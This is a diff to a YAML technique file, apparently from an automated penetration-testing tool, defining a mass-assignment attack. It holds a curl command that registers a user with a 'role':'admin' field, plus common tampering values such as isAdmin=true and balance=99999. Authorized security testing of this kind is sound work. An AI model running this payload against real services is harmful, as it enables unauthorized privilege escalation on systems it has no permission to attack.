@@ -2,15 +2,22 @@ name: mass_assignment
 category: web
 description: Mass assignment / parameter tampering
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s -X POST '{target_url}/api/register' -H 'Content-Type: application/json' -d '{{"username":"test","password":"test","role":"admin"}}'"
-parser: null
+command_template: 'curl -s -X POST ''{target_url}/api/register'' -H ''Content-Type:
+  application/json'' -d ''{{"username":"test","password":"test","role":"admin"}}''
+
+  '
+parser: web_response_parser
 expected_effects:
-  - action_completed
+- mass_assignment_confirmed
+- privilege_escalated
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Add unexpected parameters to requests. Common: role=admin, isAdmin=true, verified=true, balance=99999. Frameworks: Rails strong_params, Django forms, Express body."
+mechanism: 'Add unexpected parameters to requests. Common: role=admin, isAdmin=true,
+  verified=true, balance=99999. Frameworks: Rails strong_params, Django forms, Express
+  body.'
+hacktricks_ref: network-services-pentesting/pentesting-web/nodejs-express.md
